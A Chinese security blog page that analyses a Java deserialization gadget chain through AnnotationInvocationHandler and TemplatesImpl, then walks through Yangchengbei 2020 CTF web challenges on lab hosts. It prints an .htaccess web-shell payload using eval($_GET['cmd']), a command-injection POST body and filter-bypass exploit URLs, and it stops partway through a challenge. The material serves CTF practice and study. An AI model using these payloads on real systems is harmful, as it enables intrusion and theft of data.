<p><code>readObject()</code>中把Templates和proxy加入到map</p>
<p><img src="https://img04.sogoucdn.com/app/a/100520146/45D5527E23A83FB8924D4D6891028448"></p>
<p>进入<code>put()</code>，</p>
<p>这里会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。</p>
<p>关键点在于<code>key.equals(k)</code>，添加的顺序是，前一个为 <code>templates</code> 后一个为<code>proxy</code>。</p>
<p>要到达<code>key.equals(k)</code>需要先满足条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code>，这个条件下面再说</p>
<p><img src="https://img04.sogoucdn.com/app/a/100520146/40ABBE1B0594FA33AB28C91E58C21E0C"></p>
<p>根据<code>||</code>的规则，第一个值为false时才能进入第二个。此时，<code>key</code>等于<code>proxy</code>，<code>e.key</code>等于<code>templates</code>类，这样<code>(k = e.key) == key</code>返回<code>false</code>。进入<code>key.equals(k)</code></p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/E06E880F199B442649390D0B2910BF57"></p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/2F4E9E68BB82BF653304F6E0D69E4423"></p>
<p>由于使用了动态代理，调用<code>Templates.equals()</code>就会进入<code>AnnotaionlnvocationHandler</code>的<code>invoke()</code>，然后因为满足if条件进入<code>equalsImpl</code>。</p>
<p>这里的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var1为当前proxy代理实例对象，等于之前的key</span><br><span class="line">var2为当前调用方法，等于equals方法对象</span><br><span class="line">var3为当前调用方法的传入参数列表，等于TemplatesImpl类，也就是之前的k和e.key</span><br></pre></td></tr></table></figure>

<p><img src="https://img02.sogoucdn.com/app/a/100520146/1145C1A981BFD65A587B3208E5974C86"></p>
<p><img src="https://img04.sogoucdn.com/app/a/100520146/6323BEE8E698663110D13EBF8B5589EB"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
<p>进入<code>equalsImpl()</code>，前两个条件都不满足，进入<code>getMemberMethods</code></p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/75CC6610FDB6AE5C2DC371F3F7AF3489"></p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/00E5FA716B7D7A68DEEA11030604FBB1"></p>
<p><img src="https://img04.sogoucdn.com/app/a/100520146/C07E15E8F37D264720B615B42EA5B534"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</p>
<p>满足条件<code>this.memberMethods</code>，<code>this.type</code>等于<code>Templates</code>，这样就会返回<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code></p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/FF87C97539A3D0BC64C59F902DBDD023"></p>
<p>回到<code>equalsImpl</code>，这里会获取<code>this.type</code>类中所有的方法，然后遍历并调用每一个方法。这里让<code>this.type</code>等于<code>Templates</code>接口就可以调用<code>Templates</code>中的所有方法，包括<code>getOutputProperties()</code>，触发payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;<span class="comment">//var1等于构造好的templates</span></span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="keyword">this</span>.getMemberMethods();<span class="comment">//var2为Templates的所有方法</span></span><br><span class="line">        <span class="keyword">int</span> var3 = var2.length;<span class="comment">//var3为Templates方法的数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;<span class="comment">//迭代Templates的所有方法</span></span><br><span class="line">            Method var5 = var2[var4];<span class="comment">//var5为Templates的中的某个方法</span></span><br><span class="line">            String var6 = var5.getName();<span class="comment">//var6为该方法的名称</span></span><br><span class="line">            Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null</span></span><br><span class="line">            Object var8 = <span class="keyword">null</span>;</span><br><span class="line">            AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);<span class="comment">//var9也为null</span></span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);<span class="comment">//运行会到这里，所以会调用Templates中的所有方法</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>执行成功</p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/A381F8D73E523E66E9A6EA8CBDBFC488"></p>
<h1 id="Hash绕过"><a href="#Hash绕过" class="headerlink" title="Hash绕过"></a>Hash绕过</h1><p>java.util.HashMap#put</p>
<p>条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code></p>
<p>调用了<code>hash()</code></p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/D61234B8B6ACCA26FDA30C75162EFABB"></p>
<p>java.util.HashMap#hash</p>
<p>进入<code>hash()</code>函数，这里调用了传入对象<code>k</code>的<code>hashCode()</code>方法，意味着有可能控制hash值，这里的<code>k</code>为创建的代理实例对象。接着调用了<code>hashCode</code></p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/8E29CE6A9F1786013B6B58714BBF90DC"></p>
<p>因为使用了动态代理，调用<code>hash(proxy)</code>时会自动跳转到<code>AnnotationInvocationHandler.invoke()</code></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
<p><img src="https://img02.sogoucdn.com/app/a/100520146/1893A31A94B460B3612FA88C00B8D5FD"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        <span class="comment">//this.memberValues由构造函数传入的，可以控制，等于map</span></span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取遍历器</span></span><br><span class="line">        <span class="keyword">for</span>( ;var2.hasNext(); ) &#123;</span><br><span class="line">            var3 = (Entry)var2.next();</span><br><span class="line">            String key = var3.getKey();<span class="comment">//（可控map的键）</span></span><br><span class="line">            Object value = var3.getValue()；<span class="comment">//（可控map的值）</span></span><br><span class="line">            var1 += <span class="number">127</span> * </span><br><span class="line">                key.hashCode() ^    <span class="comment">//可控map的键 的 hashCode                </span></span><br><span class="line">                memberValueHashCode(value); <span class="comment">//可控map的值的 hashCode</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123;<span class="comment">//不是数组的话获取传入值的hashCode。</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode(); <span class="comment">//返回var0这个对象的hashCode</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>实际执行</p>
<p><strong>Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode</strong></p>
<p>只要让可控键的hashCode为0即可，利用<code>f5a5a608</code>的hashcode为0，字符串的hashcode也为0，在POC中构造<code>map.put(&quot;f5a5a608&quot;, templates)</code>,</p>
<p>这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 &#x3D; 127 * 0 ^ templates的hashCode</span><br><span class="line">var1 &#x3D; templates的hashCode</span><br></pre></td></tr></table></figure>



<h1 id="map-put"><a href="#map-put" class="headerlink" title="map.put"></a>map.put</h1><p>java.util.HashSet#add</p>
<p><img src="https://img01.sogoucdn.com/app/a/100520146/1B8AB0A0C0C6AE375D262B9F9C085B3E"></p>
<p>payload中把<code>map.put(&quot;f5a5a608&quot;, templates)</code>放在最后，这是因为<code>add</code>方法中调用了<code>map.put</code>，如果放在前面就会满足条件直接在本地触发命令执行，经过序列化之后的数据不能反序列化成功。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-22T23:44:21.000Z" title="2021-04-22T23:44:21.000Z">2021-04-23</time>发表</span><span class="level-item"><time dateTime="2021-04-22T23:55:52.670Z" title="2021-04-22T23:55:52.670Z">2021-04-23</time>更新</span><span class="level-item">8 分钟读完 (大约1262个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/">羊城杯2020复现</a></h1><div class="content"><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>给出源码，可以看到只能上传一个文件，并且文件名只能为<code>.xxxx</code>这种形式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>利用<code>.htaccess</code>中的<code>auto_prepend_file</code>，在运行php文件前会自动包含指定的文件，这里过滤了<code>file</code>，可以用<code>\</code>绕过，把恶意代码注释掉，最后加上<code>\</code>转义，因为最后拼接上了<code>Hello, world</code>，需要加上\来换行注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;\</span><br></pre></td></tr></table></figure>



<p>最终结果，运行任何一个php文件的时候都会自动包含.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;\Hello, world</span><br></pre></td></tr></table></figure>





<p>请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\</span><br></pre></td></tr></table></figure>

<p><img src="https://img03.sogoucdn.com/app/a/100520146/7BB930AB1C30B3049B19FB0F378322D3"></p>
<p>执行成功，接下来读取flag即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn&#x2F;index.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="https://img02.sogoucdn.com/app/a/100520146/73B3E7CE9B587005E1719012513786BD"></p>
<h1 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h1><p>查看源码发现<code>Hei_Mao_Jing_Chang.mp3</code>文件</p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/E0C8300AE63F94394BCF13B22242EAFE"></p>
<p>访问Hei_Mao_Jing_Chang.mp3得到源码</p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/30ACA6F8C958209148F585D0FCC6B52E"></p>
<p><code>hash_hmac</code>函数会把第二个参数作为内容，第三个参数作为密钥，用第一个参数作为算法进行加密，我们只要给<code>$_POST[&#39;White-cat-monitor&#39;]</code>传入一个数组，hash_hmac函数就会返回null，这样密钥就可控了，我根据密钥加密要执行的命令，然后把加密后的hash传入<code>$_POST[&#39;Black-Cat-Sheriff&#39;]</code>即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>





<p>生成hash值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="literal">null</span>);</span><br><span class="line">var_dump(<span class="variable">$hh</span>);</span><br></pre></td></tr></table></figure>

<p>post数据，buu的flag在env里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff&#x3D;afa668e24c118929d895750ef36b2a6382377049b3fe4a00f5a0dcdf2dc8b69a&amp;One-ear&#x3D;asd;env&amp;White-cat-monitor[]&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://img01.sogoucdn.com/app/a/100520146/77415FD8147628170E692E77DE3BB730"></p>
<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>存在robots.txt</p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/D0B189B21794B126D071578055374C9B"></p>
<p>这里发现base64、rot13都被过滤，用url二次编码绕过，用<code>%6%32</code>代替<code>b</code>，<code>%32</code>解码为<code>2</code>，合并成<code>%62</code>解码为<code>b</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;17a28883-1f23-40fd-a3f6-98a5cf1cd5fc.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%6%32ase64-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure>

<p><img src="https://img01.sogoucdn.com/app/a/100520146/D8C77FA928658399B40F68B74058E733"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))&#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . <span class="variable">$count</span> . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>读取check.php</p>
